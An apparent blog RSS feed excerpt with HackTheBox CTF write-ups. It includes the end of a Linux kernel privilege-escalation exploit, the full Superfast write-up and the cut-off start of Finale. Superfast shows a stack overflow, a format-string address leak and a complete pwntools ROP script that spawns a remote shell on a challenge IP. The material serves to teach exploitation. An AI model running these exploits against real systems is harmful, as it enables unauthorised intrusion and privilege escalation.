    FD_KNOTE = open(&quot;/dev/knote&quot;, O_RDONLY);
    if (FD_KNOTE &lt; 0)
    {
        puts(&quot;main(): open failed&quot;);
        exit(1);
    }

    /* case KNOTE_CREATE:
     *     char *data = kmalloc(ku.len, GFP_KERNEL);
     *     knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data = data;
     *     knotes[ku.idx]-&gt;len = len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) 
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
     *
     * doesn&apos;t reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */

    puts(&quot;[*] creating note 0: fail pls&quot;);
    cmd_send(KNOTE_CREATE, 0, (void*)0x1337, 32);
 
    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = &quot;idc3&quot;;
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf(&quot;[*] new knote_t size: %lu\n&quot;, sizeof(knote_t));
    puts(&quot;[*] allocating malicious payload knote&quot;);
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
    
    /* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;= 10 || !knotes[ku.idx]) 
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
     * 
     * trigger function call to encrypt_fun
     */
    puts(&quot;[*] calling (hopefully overwrited) encrypt function&quot;);
    cmd_send(KNOTE_ENCRYPT, 0, &quot;idc4&quot;, 5);

    puts(&quot;[-] exploit failed :(&quot;);
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Complete </span><code spellcheck="false" style="white-space: pre-wrap;"><span>exploit.c</span></code></p></figcaption></figure><p>Now it&apos;s time to perform the exploit on the remote machine. I wisely chose <code>musl-gcc</code> as the compiler in <code>compress.sh</code> since it decreases the size of static builds A LOT. The static binary sizes from <code>gcc</code> and <code>musl-gcc</code> are respectfully <code>800000</code> bytes and <code>34000</code> bytes. In order to transfer the exploit to the remote machine, I used <code>encode.sh</code> to encode the exploit binary, <strong>copy it to clipboard</strong> and decoded it using BASH utilities on the remote machine:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">tar -czO $1 | base64 -w160


echo &quot;\n\n===== TO DECODE =====&quot; &gt; /dev/stderr
echo &quot;echo &lt;...&gt; | base64 -d | tar -xzO &gt; exploit&quot; &gt; /dev/stderr
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encode.sh</span></code><span style="white-space: pre-wrap;"> used to transfer files from local machine to the remote CTF box</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ encode.sh initramfs/exploit | xsel -b


===== TO DECODE =====
echo &lt;...&gt; | base64 -d | tar -xzO &gt; exploit</code></pre><figcaption><p><span style="white-space: pre-wrap;">Proof-of-concept of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encode.sh</span></code><span style="white-space: pre-wrap;"> to encode the binary</span></p></figcaption></figure><h2 id="afterword">Afterword</h2><p>I really hope you enjoyed the challenge and write-up as much as I did. Please let me know on <a href="https://twitter.com/notselwyn">Twitter</a> if you want me to make a write-up about exploiting this CTF with <em>real</em> kernel primitives like <code>seq_operations</code> and <code>setxattr</code>. </p><p>If you like this pwn content, please checkout the <a href="https://pwning.tech/blacksmith/">HackTheBox - Blacksmith</a> write-up, or checkout the <a href="https://pwning.tech/tag/heap-memory">Heap Memory</a> and <a href="https://pwning.tech/tag/linux-kernel/">Linux Kernel </a>tag pages on the site to read more kernel related blogposts. </p>]]></content:encoded></item><item><title><![CDATA[Superfast (HackTheBox)]]></title><description><![CDATA[<p>Hey folks. In this write-up, we&apos;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&apos;re going to perform a <strong>single-byte overwrite</strong> to <strong>bypass ASLR</strong>, <strong>leak stack pointers</strong>, and perform a <strong>Return Oriented Programming </strong>(ROP) chain. The description</p>]]></description><link>https://pwning.tech/superfast/</link><guid isPermaLink="false">658f44f8d32e980001de21ec</guid><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[ROP chains]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[BusinessCTF2022]]></category><category><![CDATA[ASLR]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Mon, 28 Nov 2022 13:21:02 GMT</pubDate><content:encoded><![CDATA[<p>Hey folks. In this write-up, we&apos;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&apos;re going to perform a <strong>single-byte overwrite</strong> to <strong>bypass ASLR</strong>, <strong>leak stack pointers</strong>, and perform a <strong>Return Oriented Programming </strong>(ROP) chain. The description of the challenge is:</p><blockquote>We&apos;ve tracked connections made from an infected workstation back to this server. We believe it is running a C2 checkin interface, the source code of which we aquired from a temporarily exposed Git repository several months ago.Apparently the engineers behind it are obsessed with speed, extending their programs with low-level code. We think in their search for speed they might have cut some corners - can you find a way in?</blockquote><p>I really enjoyed pwning this challenge since it has a unique and quite realistic target which I haven&apos;t seen before in CTFs.</p><h1 id="index">Index</h1><ul><li>First looks</li><li>Finding primitives</li><li>Developing the ROP chain</li><li>Retrieving the flag</li></ul><h1 id="first-looks">First looks</h1><p>We&apos;re given a PHP file with a shared object (.so) written in C, and we&apos;re given a source directory for the shared object.</p><figure class="kg-card kg-code-card"><pre><code>.
&#x251C;&#x2500;&#x2500; build_docker.sh
&#x251C;&#x2500;&#x2500; challenge
&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; index.php
&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; php_logger.so
&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; start.sh
&#x251C;&#x2500;&#x2500; Dockerfile
&#x2514;&#x2500;&#x2500; src
    &#x251C;&#x2500;&#x2500; build.sh
    &#x251C;&#x2500;&#x2500; config.m4
    &#x251C;&#x2500;&#x2500; php_logger.c
    &#x2514;&#x2500;&#x2500; php_logger.h

2 directories, 9 files
</code></pre><figcaption>Directories given with the challenge</figcaption></figure><p>In <code>/challenge/start.sh</code> we can see that the challenge code gets bootstrapped using:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">#!/bin/sh
while true; do php -dextension=/php_logger.so -S 0.0.0.0:1337; done</code></pre><figcaption>The content of start.sh</figcaption></figure><p>We can see that PHP loads <code>php_logger.so</code> as a binary extension for the webserver.</p><h1 id="finding-primitives">Finding primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact, like teamwork.</p><h3 id="analysing-indexphp">Analysing index.php</h3><p>The content of index.php (below) checks for a header called <code>Cmd-Key</code> and a parameter <code>cmd</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-php">&lt;?php
if (isset($_SERVER[&apos;HTTP_CMD_KEY&apos;]) &amp;&amp; isset($_GET[&apos;cmd&apos;])) {
	$key = intval($_SERVER[&apos;HTTP_CMD_KEY&apos;]);
	if ($key &lt;= 0 || $key &gt; 255) {
		http_response_code(400);
	} else {
		log_cmd($_GET[&apos;cmd&apos;], $key);
	}
} else {
	http_response_code(400);
}
</code></pre><figcaption>Content of index.php</figcaption></figure><p>One of the most important stages of exploit development is making a reproducing environment. Considering I want to run GDB on <code>php_logger.so</code>, I will run the challenge without Docker. I can run the PHP <code>index.php</code> with <code>php -dextension=./php_logger.so -S 0.0.0.0:1337</code> in <code>/challenge/</code> and I can send the HTTP request using <code>curl &apos;<a href="http://127.0.0.1:1337?cmd=123">http://127.0.0.1:1337/index.php?cmd=123</a>&apos; -H &apos;Cmd-Key: 123</code>. We can see it succeeds because it returns a 200 status code. </p><figure class="kg-card kg-code-card"><pre><code>[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Accepted
[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 [200]: GET /?cmd=123
[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Closing
</code></pre><figcaption>Verbose output of the PHP webserver</figcaption></figure><p>Regarding functionality, we can see that <code>index.php</code> calls <code>log_cmd($cmd, $key)</code> with <code>0 &lt; $key &lt; 256</code>. </p><h3 id="analyzing-phploggerso">Analyzing php_logger.so</h3><p>We can find the source code of <code>php_logger.so</code> in <code>/src/php_logger.c</code>. Under which, we can find the source code of <code>log_cmd()</code> as well. We can see that log_cmd() retrieves function arguments using <code>zend_parse_parameters()</code>. Then, it calls <code>decrypt($cmd, $cmdlen, $key)</code> and - if the return is valid - appends to the <code>/tmp/log</code> file. &#xA0;</p><figure class="kg-card kg-code-card"><pre><code class="language-c">PHP_FUNCTION(log_cmd) {
    char* input;
    zend_string* res;
    size_t size;
    long key;
    if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;sl&quot;, &amp;input, &amp;size, &amp;key) == FAILURE) {
        RETURN_NULL();
    }
    res = decrypt(input, size, (uint8_t)key);
    if (!res) {
        print_message(&quot;Invalid input provided\n&quot;);
    } else {
        FILE* f = fopen(&quot;/tmp/log&quot;, &quot;a&quot;);
        fwrite(ZSTR_VAL(res), ZSTR_LEN(res), 1, f);
        fclose(f);
    }
    RETURN_NULL();
}
</code></pre><figcaption>Source code of <code>log_cmd()</code></figcaption></figure><p>This function does look safe, so the vulnerability is in <code>decrypt(input, size, key)</code>. This function checks if the size of the command is less than the size of the stack buffer. If it is more it will return, but if it is less it will memcpy() and XOR the buffer with the key. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">zend_string* decrypt(char* buf, size_t size, uint8_t key) {
    char buffer[64] = {0};
    if (sizeof(buffer) - size &gt; 0) {
        memcpy(buffer, buf, size);
    } else {
        return NULL;
    }
    for (int i = 0; i &lt; sizeof(buffer) - 1; i++) {
        buffer[i] ^= key;
    }
    return zend_string_init(buffer, strlen(buffer), 0);
}
</code></pre><figcaption>Source code of <code>decrypt()</code></figcaption></figure><p>We can see that <code>sizeof(buffer) - size &gt; 0</code> is used for the size check. However, <code>sizeof()</code> returns <code>size_t</code>, which is an <strong>unsigned </strong>integer on 32-bit and (in this case) an <strong>unsigned</strong> long on 64-bit. Since we are essentially doing <code>ulong - int &gt; int</code>, we are using an unsigned value as a base value which means the value will wrap around. For example, in this case <code>(uint)0 - (int)1</code> would become <code>2**32-1</code>, instead of <code>-1</code>. A practical example would be the one below. The output of the program is &#xA0;<code>4294967295 1</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int main()
{
    unsigned int a = 5;
    int b = 6;

    printf(&quot;%u %d&quot;, a - b, a - b &gt; 0);
}
</code></pre><figcaption>Demo of interaction between (unsigned) integers</figcaption></figure><p>That means that <code>sizeof(buffer) - size &gt; 0)</code> is always true, unless <code>sizeof(buffer) == size</code>. The result of that is a buffer overflow on the stack which we can leverage for a <strong>control flow hijacking primitive</strong>. Using Ghidra - the reverse engineering suite developed by the NSA - we can see that the offset from the buffer to the return address on the stack is 0x98 (152) bytes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2022/11/image-6.png" class="kg-image" alt loading="lazy" width="722" height="664" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-6.png 600w, https://pwning.tech/content/images/2022/11/image-6.png 722w" sizes="(min-width: 720px) 720px"><figcaption>Stack variable offsets in Ghidra</figcaption></figure><p>However, ASLR is enabled. That means that we cannot guess the library&apos;s memory address and hence cannot guess a return address for control flow hijacking. However, the smallest 12 bits of an address are <strong>not random</strong>,<strong> </strong>and thus can we reliably overwrite 12 bits of the return address. Say our normal return address would be <code>0x555555559a1e</code>, in the next program, it could be <code>0x55555123fa1e</code>, but the <code>0xa1e</code> at the end doesn&apos;t change, because it&apos;s the smallest 12 bits. </p><p>The reason only the first 12 bits of the address don&apos;t change, is because they point to 4096 bytes (2 ** 12 bits), which is the page size. The kernel - the manager of ASLR - can&apos;t work with addresses smaller than 4096 bytes. &#xA0; </p><p>Sadly, we can only write bundles of 8 bits (1 byte) at a time considering we&apos;re working with a <code>char</code> data type. This means we could only overwrite the <code>0x1e</code> part of the addresses listed above, which narrows our possible return address area. </p><p>In Ghidra, we can figure out that the return address from <code>decrypt()</code> to <code>log_cmd()</code> (without ASLR) is equal <code>0x1014129</code>. This means our scope of possible return addresses ranges from <code>0x1014100</code> to <code>0x10141ff</code>. </p><pre><code class="language-nasm">      0010141e 48 89 ce     MOV       param_2,RCX
      00101421 48 89 c7     MOV       param_1,RAX
      00101424 e8 07 fc     CALL      decrypt
               ff ff
      00101429 48 89 44     MOV       qword ptr [RSP + local_10],RAX
               24 38
      0010142e 48 83 7c     CMP       qword ptr [RSP + local_10],0x0
               24 38 00
</code></pre><p>The code in our return scope is the following. We can see that <code>decrypt()</code> is called, <code>print_message()</code> is called and a bunch of file IO functions. Internally, <code>print_message()</code> is a wrapper for <code>php_printf()</code>: the <a href="https://www.php.net/manual/en/function.printf.php">printf()</a> function in PHP. This is interesting because it outputs to the HTTP response body, which means that we can <strong>leak pointers</strong>. &#xA0;</p><figure class="kg-card kg-code-card"><pre><code class="language-c">    *(undefined4 *)(param_2 + 8) = 1;
  }
  else {
    iVar1 = decrypt(local_20,local_28,(size_t *)(local_30 &amp; 0xff),local_28,(size_t)inlen);
    local_10 = CONCAT44(extraout_var,iVar1);
    if (local_10 == 0) {
      print_message(&quot;Invalid input provided\n&quot;);
    }
    else {
      local_18 = fopen(&quot;/tmp/log&quot;,&quot;a&quot;);
      fwrite((void *)(local_10 + 0x18),*(size_t *)(local_10 + 0x10),1,local_18);
      fclose(local_18);
    }
    *(undefined4 *)(param_2 + 8) = 1;
  }
  return;
}</code></pre><figcaption>C decompilation of our return scope&#xA0;</figcaption></figure><p>However, in order to leak pointers with <code>print_message()</code>, we need to set the RDI register to the printf format string. Fortunately, the RDI register is set to the <code>input</code> argument of <code>decrypt(char* buf, size_t size, uint8_t key)</code> at <code>0x101390</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00101385 48 8b 84     MOV       RAX,qword ptr [RSP + local_18]
               24 a0 00 
               00 00
      0010138d 48 89 c6     MOV       inputlen,RAX
      00101390 48 89 cf     MOV       input,param_4
      00101393 e8 e8 fc     CALL      &lt;EXTERNAL&gt;::memcpy
               ff ff
      00101398 48 8b 54     MOV       key,qword ptr [RSP + local_58]
               24 60
</code></pre><figcaption>Assembly code which moves the input into the RDI register</figcaption></figure><p>When I try to fuzz using a script, I receive the following output: </p><figure class="kg-card kg-code-card"><pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\x81\xd5\x84U\x80~</code></pre><figcaption>Fuzzing output</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor
import requests

xorkey = 1

s = requests.session()
headers = {&quot;cmd-key&quot;: str(xorkey)}

# offset = 152 
payload = b&quot;A&quot;*152 + b&quot;\x40&quot;
content = s.get(b&quot;http://127.0.0.1:1337?cmd=&quot;+payload, headers=headers).content
print(xor(content, xorkey))</code></pre><figcaption>Script used to fuzz</figcaption></figure><p>However, when we remove the <code>xor()</code> function call, we can see that the end of the response is an address like <code>b&apos;A\x80\xd4\x85T\x81\x7f&apos;</code>. Using <code>print(hex(u64(content[63:].ljust(8, b&apos;\x00&apos;))))</code> we can translate it to <code>0x7f815485d48041</code>. In order to identify where this leak happens, we can start a GDB server. We leak the address <code>0x7f651305f54041</code> and in GDB we can see with <code>vmmap</code> (in <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>) that this falls under <code>0x7f6513000000 &#xA0; &#xA0; 0x7f6513200000 rw-p &#xA0; 200000 &#xA0; &#xA0; &#xA0;0 [anon_7f6513000]</code>. Since this isn&apos;t executable it&apos;s irrelevant for the ROP chain. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor, gdb, u64
import requests
import time

gdb.debug(args=[&apos;php&apos;, &apos;-t&apos;, &apos;./pwn_superfast/challenge&apos;, &apos;-dextension=./pwn_superfast/challenge/php_logger.so&apos;, &apos;-S&apos;, &apos;0.0.0.0:1337&apos;], gdbscript=&apos;continue&apos;)
time.sleep(5)

xorkey = 1

s = requests.session()
headers = {&quot;cmd-key&quot;: str(xorkey)}

payload = b&quot;A&quot;*152 + b&quot;\x40&quot;
content = s.get(b&quot;http://127.0.0.1:1337?cmd=&quot;+payload, headers=headers).content
print(hex(u64(content[63:].ljust(8, b&apos;\x00&apos;))))

time.sleep(999)
</code></pre><figcaption>Script for debugging using GDB</figcaption></figure><p>Since that is useless, we need to find another way to leak addresses. To do that, we can utilize the fact that we&apos;re calling <code>printf()</code>. By supplying a payload like <code>%08x %08x %08x %08x</code> we can leak the stack. By trial and error, I found out that we can leak the stack, php_logger.so and the PHP binary using the format string <code>%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_</code>. Using the following payload, we can see the following leaks:</p><figure class="kg-card kg-code-card"><pre><code>php @ 0x55c720a64000
php_logger.so @ 0x7f609866e000
stack @ 0x7fff10fbd480</code></pre><figcaption>Output of the script</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import xor, u64, gdb
import requests
import time

gdb.debug(args=[&apos;php&apos;, &apos;-t&apos;, &apos;./pwn_superfast/challenge&apos;, &apos;-dextension=./pwn_superfast/challenge/php_logger.so&apos;, &apos;-S&apos;, &apos;0.0.0.0:1337&apos;], gdbscript=&apos;continue&apos;)

time.sleep(3)

xorkey = 0x4
s = requests.session()
headers = {&quot;cmd-key&quot;: str(xorkey)}

fmt = b&apos;%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_&apos;
payload = xor(fmt + b&quot;A&quot;*(152 - len(fmt)), xorkey) + b&quot;\x40&quot;
url = b&quot;http://127.1:1337/index.php?cmd=&quot; + payload
print(url)

content = s.get(url, headers=headers).content
addresses = content.split(b&quot;_&quot;)

php_base = int(addresses[5], 16)-0x55e240
logger_base = int(addresses[8], 16)-0x1445
stack = int(addresses[0], 16)

print(&quot;php @&quot;, hex(php_base))
print(&quot;php_logger.so @&quot;, hex(logger_base))
print(&quot;stack @&quot;, hex(stack))

time.sleep(999)
</code></pre><figcaption>Payload for leaking addresses</figcaption></figure><p>We have the needed primitives, so we can develop the ROP chain.</p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Now we can use pwntools&apos; ELF classes in order to make automatic ROP-chains. Using pwntools&apos; ELF class we can see that the <code>execl</code> function in the PLT section of the <code>php</code> binary. This means we can use it to spawn a shell. Our strategy is:</p><ol><li>Leaking the address of the PHP binary and the <code>php_logger.so</code> in memory.</li><li>dup2(4, N) to set stdin, stdout and stderr file descriptors to the TCP connection file descriptor for the webserver. </li><li> execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 0) to spawn the /bin/sh executable</li></ol><p>We can generate a ROP chain automatically with pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">rop = ROP(php)

&apos;&apos;&apos;
fd[0]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[1]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[2]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[3]      tcp 0.0.0.0:1337 =&gt; 0.0.0.0:0 (listen)
fd[4]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
&apos;&apos;&apos;

# set connection socket to stdin/stdout/stderr
rop.call(&apos;dup2&apos;, [4, 0])
rop.call(&apos;dup2&apos;, [4, 1])
rop.call(&apos;dup2&apos;, [4, 2])

binsh = next(php.search(b&quot;/bin/sh\x00&quot;))

rop.call(&apos;execl&apos;, [binsh, binsh, 0])
print(rop.dump())</code></pre><figcaption>Python code for generating the ROP chain</figcaption></figure><p>Which gives the following ROP chain:</p><figure class="kg-card kg-code-card"><pre><code>0x0000:   0x56244b60816b pop rdi; ret
0x0008:              0x4 [arg0] rdi = 4
0x0010:   0x56244b6043fc pop rsi; ret
0x0018:              0x0 [arg1] rsi = 0
0x0020:   0x56244b601be0 dup2
0x0028:   0x56244b60816b pop rdi; ret
0x0030:              0x4 [arg0] rdi = 4
0x0038:   0x56244b6043fc pop rsi; ret
0x0040:              0x1 [arg1] rsi = 1
0x0048:   0x56244b601be0 dup2
0x0050:   0x56244b60816b pop rdi; ret
0x0058:              0x4 [arg0] rdi = 4
0x0060:   0x56244b6043fc pop rsi; ret
0x0068:              0x2 [arg1] rsi = 2
0x0070:   0x56244b601be0 dup2
0x0078:   0x56244b60816b pop rdi; ret
0x0080:   0x56244bd03fc3 [arg0] rdi = 94713890750403
0x0088:   0x56244b60487c pop rdx; ret
0x0090:              0x0 [arg2] rdx = 0
0x0098:   0x56244b6043fc pop rsi; ret
0x00a0:   0x56244bd03fc3 [arg1] rsi = 94713890750403
0x00a8:   0x56244b6042d0 execl
</code></pre><figcaption>ROP chain generated by pwntools</figcaption></figure><p>As we can see, it does the following:</p><figure class="kg-card kg-code-card"><pre><code>dup(4, 0)
dup(4, 1)
dup(4, 2)
execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 0)</code></pre><figcaption>C representation of the ROP chain</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>I coded the following script to utilize the ROP chain. If we run this, we get a shell on the box. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import xor, u64, gdb, ELF, p64, remote, ROP, context
import requests
import time
import urllib

#gdb.debug(args=[&apos;/usr/bin/php&apos;, &apos;-t&apos;, &apos;./pwn_superfast/challenge&apos;, &apos;-dextension=./pwn_superfast/challenge/php_logger.so&apos;, &apos;-S&apos;, &apos;0.0.0.0:1337&apos;], gdbscript=&apos;continue&apos;)
#time.sleep(5)

target_ip = b&quot;161.35.173.232&quot;
target_port = b&quot;31302&quot;

target_host = b&quot;http://&quot; + target_ip + b&quot;:&quot; + target_port

s = requests.session()
headers = {&quot;cmd-key&quot;: &quot;1&quot;}

fmt = b&apos;%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_&apos;
payload = xor(fmt + b&quot;A&quot;*(152 - len(fmt)), 1) + b&quot;\x40&quot;

print(&quot;[*] sending payload...&quot;)
content = s.get(target_host + b&quot;/index.php?cmd=&quot; + payload, headers=headers).content
addresses = content.split(b&quot;_&quot;)

print(&quot;[*] loading addresses...&quot;)
# set context for ROP()
#context.binary = php = ELF(&apos;/usr/bin/php&apos;, checksec=False)
context.binary = php = ELF(&apos;./php&apos;, checksec=False)
php.address = int(addresses[5], 16) - php.sym.executor_globals

php_logger = ELF(&apos;pwn_superfast/challenge/php_logger.so&apos;, checksec=False)
php_logger.address = int(addresses[8], 16)-0x1445
stack = int(addresses[0], 16)

print(&quot;[+] php @&quot;, hex(php.address))
print(&quot;[+] php_logger.so @&quot;, hex(php_logger.address))
print(&quot;[+] stack @&quot;, hex(stack))

rop = ROP(php)

&apos;&apos;&apos;
fd[0]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[1]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[2]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[3]      tcp 0.0.0.0:1337 =&gt; 0.0.0.0:0 (listen)
fd[4]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
&apos;&apos;&apos;

# set connection socket to stdin/stdout/stderr
rop.call(&apos;dup2&apos;, [4, 0])
rop.call(&apos;dup2&apos;, [4, 1])
rop.call(&apos;dup2&apos;, [4, 2])

binsh = next(php.search(b&quot;/bin/sh\x00&quot;))

rop.call(&apos;execl&apos;, [binsh, binsh, 0])
print(rop.dump())

payload = b&apos;A&apos;*152 + rop.chain()
http = &quot;GET /index.php?cmd=&quot; + urllib.parse.quote(payload) + &quot; HTTP/1.1\n&quot;
http += &quot;Cmd-Key: 1\n\n&quot;

print(&quot;[*] sending payload for shell...&quot;)
p = remote(target_ip, int(target_port))
p.send(http.encode())
p.interactive()

time.sleep(999)</code></pre><figcaption>Python script for retrieving the flag</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ python3 script.py
[*] sending payload...
[*] loading addresses...
[+] php @ 0x55da3ce00000
[+] php_logger.so @ 0x7fb906c50000
[+] stack @ 0x7ffee56eddc0
[*] Loaded 327 cached gadgets for &apos;./php&apos;
0x0000:   0x55da3d00816b pop rdi; ret
0x0008:              0x4 [arg0] rdi = 4
0x0010:   0x55da3d0043fc pop rsi; ret
0x0018:              0x0 [arg1] rsi = 0
0x0020:   0x55da3d001be0 dup2
0x0028:   0x55da3d00816b pop rdi; ret
0x0030:              0x4 [arg0] rdi = 4
0x0038:   0x55da3d0043fc pop rsi; ret
0x0040:              0x1 [arg1] rsi = 1
0x0048:   0x55da3d001be0 dup2
0x0050:   0x55da3d00816b pop rdi; ret
0x0058:              0x4 [arg0] rdi = 4
0x0060:   0x55da3d0043fc pop rsi; ret
0x0068:              0x2 [arg1] rsi = 2
0x0070:   0x55da3d001be0 dup2
0x0078:   0x55da3d00816b pop rdi; ret
0x0080:   0x55da3d703fc3 [arg0] rdi = 94395821998019
0x0088:   0x55da3d00487c pop rdx; ret
0x0090:              0x0 [arg2] rdx = 0
0x0098:   0x55da3d0043fc pop rsi; ret
0x00a0:   0x55da3d703fc3 [arg1] rsi = 94395821998019
0x00a8:   0x55da3d0042d0 execl
[*] sending payload for shell...
[+] Opening connection to b&apos;161.35.173.232&apos; on port 31302: Done
[*] Switching to interactive mode
sh: turning off NDELAY mode
$ whoami
ctf</code></pre><figcaption>Output of the exploit</figcaption></figure><p>Thanks for reading my write-up about the HackTheBox Business CTF 2022 Superfast challenge; I hope you learned as much as I did.</p>]]></content:encoded></item><item><title><![CDATA[Finale (HackTheBox)]]></title><description><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/finale">Finale</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>It&apos;s the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true!</blockquote>]]></description><link>https://pwning.tech/finale/</link><guid isPermaLink="false">658f44f8d32e980001de21e9</guid><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBoo]]></category><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[ROP chains]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[Stack memory]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sat, 26 Nov 2022 18:27:03 GMT</pubDate><content:encoded><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/finale">Finale</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>It&apos;s the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true! Wish you the best for the upcoming year!</blockquote><p>In this write-up, we will learn about the <strong>stack, ROP chains</strong>, and prioritizing<strong> attack vectors</strong>. </p><p>Spoiler alert: if you can&apos;t find the libc version, it&apos;s not a bug. </p><h1 id="summary">Summary</h1><ul><li>First looks</li><li>Finding vulnerability primitives</li><li>Developing the ROP chain</li><li>Retrieving the flag</li><li>Failed attempt</li></ul><h1 id="first-looks">First looks</h1><p>We are given an executable binary called <code>finale</code>. Upon performing a dynamic analysis, we are prompted for a password which means that we&apos;ll need to do a static analysis in order to proceed. </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">[Strange man in mask screams some nonsense]: iut2rxgf

[Strange man in mask]: In order to proceed, tell us the secret phrase: &lt;...&gt;

[Strange man in mask]: Sorry, you are not allowed to enter here!</code></pre><figcaption>The dynamic analysis</figcaption></figure><p>Running pwntools&apos; <code>checksec</code> on <code>finale</code> gives us:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ checksec finale
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><figcaption>Checksec output</figcaption></figure><p>The fields mean:</p><ul><li>Arch: the CPU architecture and instruction set (x86, ARM, MIPS, ...)</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/relro">RELRO</a>: Relocation Read-Only - secures the <a href="https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite">dynamic linking process</a></li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/canaries">Stack Canaries</a>: protects against stack buffer overflow attacks</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/no-execute">NX</a>: No eXecute - write-able memory cannot be executed</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/pie">PIE</a>: Position Independable Executable - address randomization</li></ul><p>For a more in-depth conclusion about checksec, please visit our <a href="https://pwning.tech/blacksmith/">previous blogpost</a> about the Blacksmith challenge on Hack The Box. The logical conclusion is that we need to perform a stack-based buffer overflow (since Stack Canaries are disabled) leading to a Return-Oriented-Programming chain (since NX is enabled). </p><h1 id="finding-vulnerability-primitives">Finding vulnerability primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher 